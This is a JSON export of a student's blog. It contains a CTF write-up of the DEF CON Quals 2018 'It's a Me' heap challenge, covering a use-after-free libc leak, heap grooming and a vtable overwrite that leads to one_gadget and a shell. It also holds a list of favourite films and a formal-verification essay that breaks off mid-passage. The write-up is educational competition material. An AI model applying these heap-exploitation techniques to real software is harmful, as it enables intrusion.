{"meta":{"title":"Tack, Hunt, Pool","subtitle":null,"description":"Where I keep all the stuff that doesn't fit in my head","author":"Ray Wang","url":"http://raywang.tech"},"pages":[{"title":"Categories","date":"2017-03-10T05:56:35.000Z","updated":"2017-03-10T05:58:29.000Z","comments":true,"path":"categories/index.html","permalink":"http://raywang.tech/categories/index.html","excerpt":"","text":""},{"title":"About Me","date":"2017-03-09T09:34:05.000Z","updated":"2017-04-05T00:21:45.000Z","comments":true,"path":"about/index.html","permalink":"http://raywang.tech/about/index.html","excerpt":"","text":"I‚Äôm a student studying computer science at the Massachusetts Institute of Technology. I‚Äôm interested in computer security, and I compete with my team, TechSec, in Capture the Flag competitions year-round. This humble blog is mostly a reference for my forgetful future self. I‚Äôll be posting CTF writeups, projects I‚Äôm working on, things I‚Äôm currently learning. I hope that other curious netizens may glean something useful from my blog as well. ‚Äì 3/10/17 Get in touch with me at raywang@mit.edu!"},{"title":"Tags","date":"2017-03-10T05:37:46.000Z","updated":"2017-03-10T05:58:31.000Z","comments":true,"path":"tags/index.html","permalink":"http://raywang.tech/tags/index.html","excerpt":"","text":""}],"posts":[{"title":"DEF CON Quals 2018: It's a Me","slug":"DEF-CON-Quals-2018-It-s-a-Me","date":"2018-05-14T23:39:05.000Z","updated":"2018-05-15T00:23:42.718Z","comments":true,"path":"2018/05/14/DEF-CON-Quals-2018-It-s-a-Me/","link":"","permalink":"http://raywang.tech/2018/05/14/DEF-CON-Quals-2018-It-s-a-Me/","excerpt":"Category: pwnable | Points: 124 | Solves: 49 | Challenge files 1234567&gt; checksec mario[*] &apos;/home/raywang/ctf/DEFCONQ2018/mario&apos; Arch: amd64-64-little RELRO: Full RELRO Stack: Canary found NX: NX enabled PIE: PIE enabled Summary This is a classic C++ menu challenge that features a UAF and heap overflow with a vtable pointer overwrite. The main heap techniques involve using a free unsorted bin chunk to leak a libc and heap address, as well as some feng shui to place an object in an overflow-able region on the heap. fortenforge, Anderson, and I combined to reverse the binary and discover the 3 separate vulnerabilities.","text":"Category: pwnable | Points: 124 | Solves: 49 | Challenge files 1234567&gt; checksec mario[*] &apos;/home/raywang/ctf/DEFCONQ2018/mario&apos; Arch: amd64-64-little RELRO: Full RELRO Stack: Canary found NX: NX enabled PIE: PIE enabled Summary This is a classic C++ menu challenge that features a UAF and heap overflow with a vtable pointer overwrite. The main heap techniques involve using a free unsorted bin chunk to leak a libc and heap address, as well as some feng shui to place an object in an overflow-able region on the heap. fortenforge, Anderson, and I combined to reverse the binary and discover the 3 separate vulnerabilities. Reversing When you first create a new Customer or login to this pizza kitchen, you have the option to order, cook, or admire Pizzas. When you order, you can specify Unicode emoji ingredients like üçç and üçÖ. If you try to order a pizza with üçç, you are kicked out and banned from ever logging in again. 123456Wellcom my friende!! It&apos;s-a me, Mario! Ready for pizza italiana vera?------------------- MAIN MENU -------------------(N)ew customer(L)ogin as customer(E)xitChoice: N 1234567&gt;&gt; Welcome ghostly------------------- USER MENU -------------------(O)rder more pizzas(C)ook all pizzas(A)dmire cooked pizzas(L)eaveChoice: When you ask to have your pizzas cooked, the ingredients are strcated together and checked with strstr ‚Äî if a pizza contains only üçÖ, it‚Äôs ‚Äúgood‚Äù, if it has üçç, it‚Äôs ‚Äúcriminal‚Äù ‚Äî then, a new Pizza object of the correct type is created. You can also provide an explanation, which is malloced onto the heap and stored in the Customer. This explanation is then freed at the end of cook, if the number of good pizzas == total number of pizzas. In pseudo-code, the Customer struct looks like 1234567Customer &#123; +0 name ptr +8 vector of ordered pizzas +32 explanation ptr +40 vector of cooked pizzas +65 isBanned&#125; Stage 1: Leak You want to trick Mario into cooking a pineapple pizza first. We make a pizza with two ingredients, one ending in \\xf0\\x9f and another starting with \\x8d\\x8d that, when strcated together, give a Unicode pineapple (\\xf0\\x9f\\x8d\\x8d). Now you‚Äôve made Mario upset! Your customer is then stored as a global variable upset_user. You also unlock a menu option to print the explanation field, which would be a UAF if the explanation were freed in cook. We can ensure that the explanation is freed by overflowing the 1-byte counter of total number of pizzas, with (16 bad + 1 good pizza) = 17 total pizzas % 16 = 1 total pizza. 1234567891011int angry_leak()&#123; printf( &quot;your friend %s ordered a pizza with %s and I should stay calm?\\n&quot;, *(_QWORD *)&amp;upset_user-&gt;nameptr, &amp;pineapple); printf( &quot;&apos;That must be a mistake&apos;, you may say. But I asked, and this is what he had to say: %s\\n&quot;, *(_QWORD *)&amp;upset_user-&gt;explanation); return puts(&quot;niente scuse&quot;);&#125; What are the contents of a freed chunk that we can leak? If the chunk is &gt;fastbin size (&gt;0x80), when it is freed, it will be inserted into the unsorted bin, which is a doubly-linked list of recently freed chunks. The fd and bk pointers will thus be populated with the address of the unsorted bin, which is in the main_arena struct in libc. 123450x555555773120: 0000000000000000 0000000000000111 | &lt;-- explanation chunk. size of explanation chunk=0x1110x555555773130: 00007FFFF7839C78 00007FFFF7839C78 | &lt;--- fd and bk pointers, both &amp;unsorted bin0x555555773140: 5151515151515151 5151515151515151 | QQQQQQQQQ&gt; &lt;---- explanation data0x555555773150: 5151515151515151 5151515151515151 | QQQQQQQQQ&gt;... We can also get a heap leak if the unsorted bin has another chunk when we free our explanation. In that case, when the explanation chunk is inserted, the fd pointer will be set to the other free chunk. The explanation chunk looks as follows: 123450x555555773120: 0000000000000000 0000000000000111 | &lt;-- explanation chunk0x555555773130: 00005555557740C0 00007FFFF7839B78 | &lt;--- fd ptr to next chunk, bk ptr to &amp;unsorted bin0x555555773140: 5151515151515151 5151515151515151 | QQQQQQQQQ&gt;0x555555773150: 5151515151515151 5151515151515151 | QQQQQQQQQ&gt;... This image from sploitfun is great for understanding the linked list structure of heap bins. Stage 2: Overflow If we successfully cook a pineapple pizza, we are also given a new menu option to ‚Äúexplain ourselves‚Äù by overwriting our explanation. It reads 300 bytes into the explanation on the heap, even though our explanation was previously malloced with a smaller length (the length of our original explanation). IDA can‚Äôt detect/decompile jump tables for some reason, so here‚Äôs the assembly of the overflow: 1234567891011121314151617.text:00000000000020BB cmp [rbp+var_1], 0.text:00000000000020BF jz loc_2154.text:00000000000020C5 lea rdi, aLastChanceExpl ; &quot;last chance, explain yourself: &quot;.text:00000000000020CC mov eax, 0.text:00000000000020D1 call printf.text:00000000000020D6 lea rax, global_customer.text:00000000000020DD mov rax, [rax].text:00000000000020E0 mov rax, [rax+20h].text:00000000000020E4 mov esi, 300 &lt;-------- length.text:00000000000020E9 mov rdi, rax &lt;-------- explanation pointer.text:00000000000020EC call another_fread.text:00000000000020F1 lea rdi, aTooBadNoExplan ; &quot;too bad, no explanation is reasonable. &quot;....text:00000000000020F8 call puts.text:00000000000020FD lea rax, global_customer.text:0000000000002104 mov rax, [rax].text:0000000000002107 mov byte ptr [rax+41h], 1.text:000000000000210B jmp short loc_2154 This overflow allows us to overwrite whatever is after the explanation in the heap. With some grooming, we can try to get a Pizza object placed right after our explanation, so we can overwrite its contents ‚Äî namely, the C++ vtable pointers for class functions. A Pizza on the heap looks like this: 123450x5555557731C0: 0000000000000000 0000000000000041 | ........A&gt; &lt;---- Pizza chunk. size of Pizza chunk=0x410x5555557731D0: 000055555575FC00 0000555555773210 | ..uUUU...&gt; &lt;---- ptr to ingredients ^ | ptr to a &quot;printPizza&quot; function The goal, of course, is to overwrite the printPizza vtable ptr to a pointer to one_gadget, so that the next time we print the pizza in admire, we get a shell. How do we ensure that the Pizza is placed right after our Customer‚Äôs explanation? If we malloc and free a large explanation, its free space will be used for other objects, and if we are lucky, a Pizza. 1234567891011120x555555773120: 0000000000000000 0000000000000041 | ........A&gt; &lt;---- Customer&apos;s explanation chunk0x555555773130: 00005555557731A0 00005555557731C0 | .1wUUU...&gt;0x555555773140: 00005555557731C0 0000555555773170 | .1wUUU..p&gt;0x555555773150: 0000555555773190 0000555555773190 | .1wUUU...&gt;0x555555773160: 4646464646464646 0000000000000031 | FFFFFFFF1&gt;0x555555773170: 0000555555773180 0000000000000004 | .1wUUU...&gt; Other junk0x555555773180: 46464600858D9FF0 4646464646464646 | .....FFFF&gt;0x555555773190: 4646464646464646 0000000000000031 | FFFFFFFF1&gt;0x5555557731A0: 00005555557731B0 0000000000000004 | .1wUUU...&gt;0x5555557731B0: 46464600858D9FF0 4646464646464646 | .....FFFF&gt;0x5555557731C0: 4646464646464646 0000000000000041 | FFFFFFFFA&gt; &lt;---- Pizza object&apos;s heap chunk0x5555557731D0: 000055555575FC00 0000555555773210 | ..uUUU...&gt; &lt;---- Pizza object Lovely! Now, we perform our overflow, first writing one_gadget to the heap, then overflowing the Pizza with the heap ptr to one_gadget. 1234560x555555773120: 0000000000000000 0000000000000041 | ........A&gt;0x555555773130: 00007FFFF74BA26A 00007FFFF74BA26A | j.K.....j&gt; &lt;---- address of one_gadget &lt;-----| 0x555555773140: 5A5A5A5A5A5A5A5A 5A5A5A5A5A5A5A5A | ZZZZZZZZZ&gt; |... |0x5555557731C0: 5A5A5A5A5A5A5A5A 5A5A5A5A5A5A5A5A | ZZZZZZZZZ&gt; &lt;---- Pizza object&apos;s heap chunk |0x5555557731D0: 0000555555773130 0000555555773130 | 01wUUU..0&gt; &lt;---- Overwritten vtable ptr, points to And when admire is called, 123456789101112131415161718192021222324252627282930313233------------------- USER MENU -------------------(O)rder more pizzas(C)ook all pizzas(A)dmire cooked pizzas(L)eaveChoice: Admire these beauties... (3)[*] Switching to interactive mode ___ | ~~--. |%=@%%/ |o%%%/ __ |%%o/ _,--~~ | |(_/ ._ ,/&apos; m%%%%| |o/ / `\\. /&apos; m%%o(_)%| |/ /o%%m `\\ /&apos; %%@=%o%%%o| /(_)o%%% `\\ / %o%%%%%=@%%| /%%o%%@=%% \\ | (_)%(_)%%o%%| /%%%=@(_)%%% | | %%o%%%%o%%%(_|/%o%%o%%%%o%%% | | %%o%(_)%%%%%o%(_)%%%o%%o%o%% | | (_)%%=@%(_)%o%o%%(_)%o(_)% | \\ ~%%o%%%%%o%o%=@%%o%%@%%o%~ / \\. ~o%%(_)%%%o%(_)%%(_)o~ ,/ \\_ ~o%=@%(_)%o%%(_)%~ _/ `\\_~~o%%%o%%%%%~~_/&apos; `--..____,,--&apos;$ lsflag$ cat flagOOO&#123;cr1m1n4l5_5h0uld_n07_b3_r3w4rd3d_w17h_fl4gs&#125; I learned the unsorted bin leak trick from Samurai‚Äôs Gulshan Singh in one of his writeups, who in turn learned it from PPP. References https://heap-exploitation.dhavalkapil.com/diving_into_glibc_heap/malloc_state.html https://sploitfun.wordpress.com/2015/02/10/understanding-glibc-malloc/","categories":[{"name":"CTF","slug":"CTF","permalink":"http://raywang.tech/categories/CTF/"}],"tags":[{"name":"writeups","slug":"writeups","permalink":"http://raywang.tech/tags/writeups/"}]},{"title":"My Favorite Films of All Time","slug":"My-Favorite-Films-of-All-Time","date":"2018-01-23T07:40:02.000Z","updated":"2018-03-24T21:16:29.000Z","comments":true,"path":"2018/01/23/My-Favorite-Films-of-All-Time/","link":"","permalink":"http://raywang.tech/2018/01/23/My-Favorite-Films-of-All-Time/","excerpt":"I discovered my interest in film at the start of college. As an arts reviewer for The Tech, MIT‚Äôs student newspaper, I had the luxury of attending advance press screenings of big-name films like Suicide Squad and the final Hobbit film. But more importantly, my reviews cultivated an appreciation for the medium and an insatiable desire to experience all it had to offer. Since then, I‚Äôve devoured films of all genres and eras, directors and actors, cinematographers and writers.","text":"I discovered my interest in film at the start of college. As an arts reviewer for The Tech, MIT‚Äôs student newspaper, I had the luxury of attending advance press screenings of big-name films like Suicide Squad and the final Hobbit film. But more importantly, my reviews cultivated an appreciation for the medium and an insatiable desire to experience all it had to offer. Since then, I‚Äôve devoured films of all genres and eras, directors and actors, cinematographers and writers. With several years of movie-going and analysis under my belt, I decided it was time to compile a running list of my favorite films of all time. Some of them top all critics‚Äô lists of greats, others are cult classics. I‚Äôll explain what I find so good about each one and why they have endless replay value for me. I‚Äôll categorize these films pretty arbitrarily ‚Äî by genre, director, or other similarities. In addition, I won‚Äôt try to compare them across categories ‚Äî that‚Äôs not very meaningful, and just trust me that they‚Äôre all equally as good and worth watching. Drama This might be my favorite category. Dramas rest on the quality of their dialogue, narrative, cinematography, and characterization ‚Äî no special effects or action sequences to bolster them. As such, they‚Äôre some of the most pure examples of the art of filmmaking. Glengarry Glen Ross (1992) It‚Äôs not hard to tell that this film is adapted from a Pulitzer- and Tony-winning play. It‚Äôs got the best dialogue of any film I‚Äôve ever seen, and takes place mostly in a single set across a single 12-hour timespan. With an all-star cast including Al Pacino, Kevin Spacey, Ed Harris, Jack Lemmon, and Alec Baldwin, this seemingly mundane office drama about competing real estate salesmen hits hard out of nowhere. American Beauty (1999) I can‚Äôt explain why I like this film so much. Perhaps it‚Äôs the film‚Äôs transcendentalist ambitions, or the theme of achieving personal freedom, that‚Äôs so striking and resonant. The evolution of each member of a suburban family, particularly protagonist patriarch Lester Burnham (Kevin Spacey), as they each rediscover themselves, is oddly fixating ‚Äî like a coming-of-age for adults. To me, it‚Äôs hauntingly beautiful and nuanced, and it only grows in my estimation the more I rewatch it. The Shawshank Redemption (1994) This prison drama regularly tops ‚Äògreatest films of all time‚Äô lists. It tells the incredible story of a gentle but inscrutable banker, Andy Dufresne (Tim Robbins), wrongfully imprisoned for life at Shawshank penitentiary for his wife‚Äôs murder, as he tries to find meaning and beauty in a place devoid of it. Narrated through the lens of Red (Morgan Freeman), his best friend in prison, the story is as moving and heart-wrenching as an exquisite caged bird ‚Äî never meant to be locked up, but a reminder of hope in dark places. Good Will Hunting (1997) Another undisputed all-time great, Good Will Hunting is about a 20-year-old South Boston kid, gifted with hidden genius but marred by a troubled childhood, who is taken under the wing of an MIT math professor and a therapist. Robin Williams, alongside a young Matt Damon, lends genuine feeling to this brilliant exploration of a singularly remarkable and fragile character. Taylor Sheridan I watched each of these three films, among the best I‚Äôve ever seen, before discovering the connection between them: they were all written or directed by Taylor Sheridan, who‚Äôs only gotten into writing/directing the past several years. These films reveal that we‚Äôre witnessing a special talent emerge ‚Äî all three are master classes in stomach-turning suspense, compelling characterization, and uncompromising realities. They resonate with me like no other set of films does. Sicario (2015) An FBI agent, Kate Macer, is enlisted by a government task force that is hell-bent on taking down a Mexican drug boss. Of the elements that make this film a must-see, action is not the most important. It‚Äôs about the combination of the suspense, the cinematography, and the score, that immerse you in the harsh realities of the drug war. This film is also one of many reasons why Emily Blunt is the most badass actress doin‚Äô it out there. Wind River (2017) Speaking of harsh realities, a neo-Western murder mystery on the Wind River Indian Reservation. Against the bleak, frigid backdrop of winter in Wyoming, a US Fish and Wildlife hunter (Jeremy Renner) and an FBI agent (Elizabeth Olsen) investigate the rape and death of a reservation girl. It highlights the inescapable, crushing existence of reservation life and the perils facing Native Americans, especially women. The magnificent writing behind the characters drives this film ‚Äî because ‚Äúout here, you survive or you surrender. That‚Äôs determined by your strength. Your spirit.‚Äù And Sheridan shows us he and his characters have both. Hell or High Water (2016) ‚ÄúSure seems foolish ‚Ä¶ The days of robbing banks and living to spend the money‚Äôs long gone, ain‚Äôt they? ‚Ä¶ Long gone for sure‚Ä¶‚Äù Two Texan brothers (Chris Pine and Ben Foster) begin a well-planned bank-robbing scheme to prevent their late mother‚Äôs ranch from being foreclosed, as a pair of Texas rangers close in on them. As with the other Sheridan films, it‚Äôs not about the action. It‚Äôs about how you can capture so much of the human condition in two characters and how bold storytelling can create an irresistible film-watching experience ‚Äî one that audiences should love all the more because it‚Äôs so rare. Tarantino Director Quentin Tarantino deserves a category all his own. In 20 years, he‚Äôs made only eight movies (Kill Bill counts as one). But, he‚Äôs said that he might only do two more and call it a career ‚Äî and it‚Äôs a testament to his sensational filmmaking style that ten films would be enough to solidify an unforgettable oeuvre. Much like the genre-benders category below, Tarantino‚Äôs films defy easy categorization. There‚Äôs always stylish, self-indulgently cheesy violence, black comedic elements, and engrossing dialogue that is at times menacing and satirical (and often both). A pastiche of Westerns, war films, and gangster flicks, Tarantino‚Äôs works are like an intravenous injection of pure extravagance. Here‚Äôs my top five, ranked: Pulp Fiction (1994) Some of my friends don‚Äôt understand this film at all. That disappoints me, since I consider it to be sublime, classic Tarantino whatever way you slice it. With several non-chronological, intertwined narratives, Pulp Fiction rests on its seat-gripping dialogue and storytelling. Inglourious Basterds (2009) A WWII black comedy where a group of Jewish-American guerrillas called the Basterds wreak havoc behind German lines with panache and pleasure. Probably Tarantino‚Äôs most universally appealing film, so you have no excuse to not see it. Reservoir Dogs (1992) Tarantino‚Äôs first big film, Reservoir Dogs deceives you into thinking that it hews closely to a conventional crime film, but veers into something much more exciting ‚Äî a gangster whodunit with a sensational ensemble cast. Replete with flashbacks and dramatic irony, this is what you discover when you crave more Tarantino. The Hateful Eight (2015) His most recent work, this post-Civil War Western mystery film could really be a play ‚Äî it takes place almost entirely in a one-room Wyoming lodge during a snowstorm. A bounty hunter taking in his live quarry to hang. But are all the lodgers who they say they are? Django Unchained (2012) A freed slave, Django (Jamie Foxx), joins forces with a charismatic and blas√© German bounty hunter (Christoph Waltz), becoming a hilarious and effective criminal-killing duo in this Western pastiche. It‚Äôs violent, explosive, relevant, and witty ‚Äî what more could you ask for in a Tarantino? Sci-Fi The Martian (2015) Ignore the scientific inaccuracies for a moment, and consider this film as a triumph of human ingenuity. When astronaut Mark Watney (Matt Damon) is mistakenly left on Mars by his crew, with no communications to Earth, he has to survive in the harshest conditions known to man. Damon, playing the resourceful and witty botanist, anchors a tour de force that makes me proud of the (hypothesized) competence and ingenuity displayed by our space organizations. Star Trek (2009) and Star Trek: Into Darkness (2013) Not your father‚Äôs Star Trek! More action than intellect, this electrifying 2009 space adventure and its 2013 sequel feature a fresh ensemble cast of Chris Pine, Zachary Quinto, Zoe Saldana, Karl Urban, and others. Set in an alternate timeline from the earlier Star Trek franchise, this USS Enterprise reboot is energetic, forceful, and universally appealing, while maintaining many original story elements. Action/Adventure John Wick (2014) Keanu Reeves has got to be one of the best, most hard-working action stars. In this film, which has gained an astonishing cult following, he plays a retired hitman of few words who seeks revenge after the theft of his car and murder of his dog, a gift from his late wife. There are two aspects that make this an all-time great action film: the world-building and the fight choreography. An entire underground assassin ecosystem is already established when the film starts ‚Äî replete with parlance, strict codes of conduct, a ‚Äòhotel for hitmen‚Äô, and its own currency. Every encounter with past friend or foe clue the audience that John Wick was once, and still is, revered and feared in the criminal underground. Reeves also trained extensively in an unconventional style of fighting called ‚Äògun-fu‚Äô, which combines martial arts with fast-paced, close-quarters gunplay. It‚Äôs a dizzying rate of clean kills, and combined with a fascinating and well-constructed universe, leaves the audience with a desire for more. Mad Max: Fury Road (2015) This is the only Mad Max film I‚Äôve seen, but it deserves a place among the best action films of all time. In post-apocalyptic Australia, the protagonist, a survivor named Max Rockatansky, (Tom Hardy), is captured by a car-worshipping group called the War Boys. He‚Äôs then caught in the middle of an all-out, high-speed desert pursuit between their tyrannical leader, Immortan Joe, and his lieutenant, Imperator Furiosa (Charlize Theron). The action and stunt sequences are beyond belief. Extravagant fight scenes takes place mostly on and around dozens of speeding vehicles, which are themselves frankensteined works of art. Every detail of this post-apocalyptic wasteland, including costume and set design, is visually sumptuous. Animated I‚Äôve probably watched these animated films, most of them Pixar classics, dozens of times each. I‚Äôm sure they‚Äôre all so popular that they need no description, but I‚Äôll try to briefly justify my ranking. The Incredibles (2004) The best superhero film ever. Makes Marvel look like a wannabe rich kid. I first saw this as a kid, and having rewatched it many times since, I‚Äôm amazed at the layers with which it appeals to a wide range of audiences. Kung Fu Panda (2008) The treatment of the central theme of this film, believing in yourself, has surprising depth. I also love the humor and camaraderie of the voice cast, including Jack Black, Jackie Chan, Angelina Jolie, Lucy Liu, and Seth Rogen. Of course, the animal animations of well-known Chinese kung fu styles (Mantis, Tiger, Monkey) are splendid. Ratatouille (2008) ‚ÄúAnyone can cook!‚Äù A rat becoming one the top chefs in Paris is such an absurd yet brilliant idea that I‚Äôm amazed Pixar was able to pull it off at all, much less to perfection. But it‚Äôs how this film weaves animal and human interactions that lends it warmth, realism, and sincerity. Finding Nemo (2003) When I imagine the splendor and vastness of the ocean, Finding Nemo is first in my thoughts. Thomas Newman‚Äôs score, emphasizing delicately plucked harp and strings, is truly the soundtrack of the deep blue. Cars (2006) Considered Pixar‚Äôs most middling franchise, Cars is underappreciated, in my opinion. I like the message of humility and friendship as the keys to success and happiness, and talking cars were animated in surprisingly creative ways. Nolan‚Äôs Thrillers Everyone knows director Christopher Nolan‚Äôs recent, high-profile, epic works (Interstellar, Inception). But his earlier thrillers are arguably better: they‚Äôre less bombastic, with all the psychological twists and turns that have made him so popular among audiences who liked to be challenged. Memento (2000) Try to keep up. This neo-noir film boasts a nonlinear storyline from the perspective of an unreliable narrator (Guy Pearce) with anterograde amnesia (inability to form new memories). He‚Äôs hunting for the ‚ÄúJohn G‚Äù who killed his wife and caused his brain injury. Along the way, your footing on the film slips every scene, constantly revising what you think you know, finally delivering an ending that will leave you catatonic in contemplation for at least a week afterwards. The Prestige (2006) Two rival stage magicians in 19th century London (Hugh Jackman and Christian Bale), once friends but turned bitter enemies, each go to great lengths attempting to outdo the other. As you absorb this enthralling mystery-thriller of illusion and deception, be careful of the stage shifting beneath you ‚Äî Nolan‚Äôs wildest twist catches some off guard, but also makes the film that much more staggering. Genre-benders Anything that I couldn‚Äôt categorize neatly with other films, I put here. This collection of sometimes peculiar movies is among my favorites, and I consider myself a lucky and keen critic for having discovered and appreciated them all. One thing that unifies them (perhaps the only thing) is that they defy genre conventions, as you‚Äôll see. Eternal Sunshine of the Spotless Mind (2004) This might be called a sci-fi rom-com drama‚Ä¶ but who knows. All that matters is that it‚Äôs a stellar performance from Jim Carrey and Kate Winslet, who play an estranged couple that have gotten their memories of each other removed by an eccentric New York firm, yet find themselves attracted to each other again. The treatment of sci-fi neuroscience and romantic redemption creates a heartfelt yet bizarre film-watching experience, and it‚Äôs achieved a strong cult following since its 2004 release. Who Framed Roger Rabbit (1988) If you were to ask me what film involved the most technical challenges and jaw-dropping production quality, it wouldn‚Äôt be what you‚Äôd expect ‚Äî I‚Äôd say the 1988 live-action/animated fantasy Who Framed Roger Rabbit. It‚Äôs set in a Hollywood where familiar cartoon characters are actually real entities that interact with humans and act in ‚Äúlive-action‚Äù cartoon films. With amazingly realistic interactions between dozens of drawn characters and real actors, this noir mystery is impressive even today. Note, it‚Äôs actually geared towards adults, with all the sexual and alcoholic trappings of stylish Hollywood crime drama. The Cabin in the Woods (2012) Horror comedy has a well-deserved bad rap, but the one gem that is The Cabin in the Woods justifies the existence of an entire genre. I can‚Äôt spoil its insane twists, but trust me when I say that if you think you know this story, SORRY, YOU DON‚ÄôT!! Watch this film and prepare to be blown away. Hot Fuzz (2007) From Edgar Wright, the virtuoso of visual comedy, this 2nd installment in the Cornetto trilogy is deliriously good. You might know Wright from Baby Driver, but this video essay explains why this director is even more renowned for his singular brand of humor and storytelling. Hot Fuzz has hints of action/adventure parody, mystery drama, and black comedy in a quiet British country town, all happening on the same Edgar Wright playground of a screen. And that‚Äôs it for now! As I said, I‚Äôll be adding more categories/films over time, so stay tuned!","categories":[{"name":"Reviews","slug":"Reviews","permalink":"http://raywang.tech/categories/Reviews/"},{"name":"Film","slug":"Reviews/Film","permalink":"http://raywang.tech/categories/Reviews/Film/"}],"tags":[{"name":"Best of","slug":"Best-of","permalink":"http://raywang.tech/tags/Best-of/"}]},{"title":"Formal Verification: The Gap Between Perfect Code and Reality","slug":"Formal-Verification:-The-Gap-between-Perfect-Code-and-Reality","date":"2017-12-20T17:07:02.000Z","updated":"2018-04-25T17:43:53.000Z","comments":true,"path":"2017/12/20/Formal-Verification:-The-Gap-between-Perfect-Code-and-Reality/","link":"","permalink":"http://raywang.tech/2017/12/20/Formal-Verification:-The-Gap-between-Perfect-Code-and-Reality/","excerpt":"Thanks to Vlad Brown and Drawings Team for Russian and Uzbek translations. In Fall 2017, I took MIT‚Äôs 6.826, Principles of Computer Systems, taught by Turing Award-winner Butler Lampson, Nickolai Zeldovich, and Frans Kaashoek. Despite its rudimentary title, it‚Äôs a grad class on building formally verified systems. Using the proof language Coq, we wrote specifications, implementations, and proofs of toy structures: a remapped disk, an atomic pair of blocks, and a replicated disk. We also read quite a few papers from the state-of-the-art in formal methods. I went into the class believing that formal verification is the future ‚Äî the only solution to a world of software ridden with bugs and security issues. But after recent events and a semester of trying to apply formal methods, I‚Äôm a serious skeptic. In this post, I‚Äôll discuss why I think formal verification has a long way to go ‚Äî and why it just doesn‚Äôt work right now.","text":"Thanks to Vlad Brown and Drawings Team for Russian and Uzbek translations. In Fall 2017, I took MIT‚Äôs 6.826, Principles of Computer Systems, taught by Turing Award-winner Butler Lampson, Nickolai Zeldovich, and Frans Kaashoek. Despite its rudimentary title, it‚Äôs a grad class on building formally verified systems. Using the proof language Coq, we wrote specifications, implementations, and proofs of toy structures: a remapped disk, an atomic pair of blocks, and a replicated disk. We also read quite a few papers from the state-of-the-art in formal methods. I went into the class believing that formal verification is the future ‚Äî the only solution to a world of software ridden with bugs and security issues. But after recent events and a semester of trying to apply formal methods, I‚Äôm a serious skeptic. In this post, I‚Äôll discuss why I think formal verification has a long way to go ‚Äî and why it just doesn‚Äôt work right now. Try it ‚Äî I dare you First, let‚Äôs talk about how we get a system that we can rubber-stamp as ‚Äúformally verified‚Äù. Simulation proofs There are two broad ways to write a formally verified system. The first, the more conventional way, involves carefully constructing specifications of the behavior of a system, an implementation of the system, and then manually writing proofs that the implementation matches the spec. All of this is written in a theorem-proving language like Coq, and then extracted to OCaml or Haskell for a runnable implementation. From personal experience with 6.826 labs, this is a nightmare. First, the proof burden is huge ‚Äî for MIT‚Äôs FSCQ file system, developed over about 1.5 years using Coq, the complete system was 10x more code than a similar unverified filesystem. Imagine that ‚Äî 2000 lines of implementation become 20,000 lines of proof! This is partly because Coq is a very general language for reasoning about mathematical logic, and it has little built-in machinery for specialized applications such as complex computer systems. So, we need to build infrastructure from scratch, as well as define our systems from the ground up ‚Äî from bits and bytes into entire disks. The labs were largely spared this ridiculous proof burden due to a lot of automation and infrastructure provided by the instructors. Indeed, 2700 lines of Coq (LoC) are devoted to proof infrastructure ‚Äî and, in the case of the toy replicated disk lab, another 1500 lines for the actual system. Where does all this overhead come from? Well, we need to support what‚Äôs called a ‚Äúsimulation proof‚Äù. In this proof style, we step through every procedure in our system and show that every reachable state in our implementation has a corresponding state in our spec. Our spec for each procedure contains three conditions ‚Äî a precondition, a postcondition, and a crash condition that is true if our code suddenly crashes. Then, our proof involves several things: Establish that the precondition of our procedure holds Prove every line/branch of the procedure is a valid transition If there are no crashes at the end of execution, prove the postcondition holds If crashes happened before the end of execution, then prove the crash condition holds before each crash, the crash recovery procedure is a valid transition, and the postcondition ends up holding Here‚Äôs a diagram of a single transition, showing the correspondence between a code state and a spec state. The double arrows are what we need to prove. 123456 spec semanticsforall state ===================&gt; exists state&apos; ^ ^^ | || V code semantics VV forall w -----------------------&gt; forall w&apos; In the FSCQ code, 6000 of 32,000 LoC were devoted to just this infrastructure. I want to highlight that we need to prove every possible code path ‚Äî exponentially many in the number of conditional statements, and doubled by considering a crash at every point. Loops need to be proved inductively. On top of all that, if any spec or implementation changes even slightly, all the specs, impls, and proofs that depend on it will change as well. This makes even small changes a huge pain. Is there any other way, you ask, before you shoot yourself? Push-button proofs Another way is the ‚Äúpush-button‚Äù style, which formulates the spec and implementation states as symbolic SMT equations that can be passed to a solver, such as Z3. This allows Z3 to automatically verify the system, without writing any manual proofs. Z3 might, for example, check whether each code operation satisfies a formula defining the relationship between code and spec states. The main effort here is cleverly designing a set of verifiable specs that is actually scalable. It‚Äôs hard to determine whether a problem is tractable for Z3, and you have to play all sorts of tricks to make it work. For example, the writers of Yggdrasil, a push-button verified filesystem, spent 4 months exploring ways to scale verification, 2-3 months building their system, and at least 6 more months experimenting with optimizations. In the end, among other wild tricks, they rely on a stack of five layered abstractions, so the solver only has to reason about one layer at a time and won‚Äôt get stuck. What goes wrong? After all this effort, either carefully designing specs that are amenable to push-button verification, or tediously writing proofs in Coq, what do we get? You‚Äôd hope for perfect code, but the truth is a lot less palatable. The guarantees of a formally verified system rest entirely on the assumptions of the system, including its trusted computing base (TCB). The TCB of a verified system includes the specs, which are manually written and hoped (fingers crossed!) to be correct, the verification tools (e.g., Coq engine, Z3, compiler), and the runtime infrastructure (OS, hardware). This should be a huge red flag. For instance, if you‚Äôve used Z3, you‚Äôll agree that it‚Äôs black magic to everyone except the developers, and my professors confess that they‚Äôve found correctness bugs, especially in decidability theories that are not commonly used. An empirical study One of the papers we read, An Empirical Study on the Correctness of Formally Verified Distributed Systems, thoroughly analyzes three recent formally-verified distributed systems ‚Äî two were Coq/OCaml-based, and a third was Dafny/SMT-based. The abstract says it all: Through code review and testing, we found a total of 16 bugs, many of which produce serious consequences, including crashing servers, returning incorrect results to clients, and invalidating verification guarantees. These bugs were caused by violations of a wide-range of assumptions on which the verified components relied. Among other serious consequences were command injection and data loss, in supposedly formally verified systems! I want to discuss some of these bugs, including where and how they were found. Most of these bugs were found through static analysis of the specs and implementations, as well as conventional debugging and network and file system fuzzing. These bugs generally occurred at the interfaces between verified and unverified components. 11 occurred at what the authors call the shim layer, the OS interface that includes system calls and other primitives. When the verified components do not exactly model the real-world OS implementation, serious bugs arise. For instance, not escaping metacharacters or not handling all possible syscall error codes caused incorrect results, leading to command injection and data loss. Real-world resource limits, such as too-large packets or stack exhaustion, also broke assumptions and crashed or hung the distributed system. The remaining bugs were due to incomplete or incorrect specs, and critical issues with the verification tools themselves. In particular, these provers were not fail-safe ‚Äî SIGINTs, exceptions, or other verifier crashes would cause the prover to report that verification succeeded! As if that‚Äôs not concerning enough, there‚Äôs two recent headlines in which supposedly formally verified systems had alarming bugs, in one case with disastrous security consequences. KRACK and CompCert Big news back in October was the KRACK attack on WPA2-protected WiFi networks. Cryptographer 